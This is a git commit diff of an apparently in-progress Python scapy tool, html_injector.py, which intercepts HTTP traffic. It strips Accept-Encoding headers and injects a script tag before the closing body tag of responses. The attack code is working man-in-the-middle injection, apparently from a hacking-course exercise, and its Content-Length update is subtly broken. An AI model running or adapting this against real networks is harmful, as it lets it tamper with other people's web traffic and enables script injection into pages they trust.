7c60b09a24bdc50bd6c4cdbdd18053aff3ee20d4
walter v <waltervannoy@yahoo.com>
2025-01-30 20:29:41 -0600

    code_injector still in progress

--- html_injector/html_injector.py
+++ html_injector/html_injector.py
@@ -5,29 +5,39 @@ import scapy.all as scapy
 import re
 
 def set_load(packet, load):
-    packet[scapy.Raw].load = load
-    del packet[scapy.IP].len
-    del packet[scapy.IP].chksum
-    del packet[scapy.TCP].chksum
-    return packet
+    new_packet= packet
+    del new_packet[scapy.IP].len
+    del new_packet[scapy.IP].chksum
+    del new_packet[scapy.TCP].chksum
+    new_packet[scapy.Raw].load = load
+
+    return new_packet
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
+        load=scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:  # Outgoing HTTP request
             print("[+] Request")
-            mod_load = re.sub(b"Accept-Encoding:.*?\r\n", b"", scapy_packet[scapy.Raw].load)
-            print(mod_load)
-            new_packet = set_load(scapy_packet, mod_load)
-            packet.set_payload(bytes(new_packet))  # Convert to bytes
+            load= re.sub(b"Accept-Encoding:.*?\r\n", b"", load)
         elif scapy_packet[scapy.TCP].sport == 80:  # Incoming HTTP response
             print("[+] Response")
-            mod_load = scapy_packet[scapy.Raw].load.replace(
+            injection_code=b"<script>alert('ya-baby');</script>"
+            load = load.replace(
                 b"</body>",
-                b"<script>alert('test');</script></body>"
+                injection_code +  b"</body>"
             )
-            new_packet = set_load(scapy_packet, mod_load)
+            content_length_search = re.search(b"(?:Content-Length:\s)(\d*)",load)
+            if content_length_search:
+                content_length = int(content_length_search.group(1))
+                new_content_length = content_length + int(len(injection_code))
+                load=load.replace(bytes(content_length), bytes(new_content_length))
+
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
+            print(new_packet.show())
             packet.set_payload(bytes(new_packet))  # Convert to bytes
+
 
     packet.accept()
 
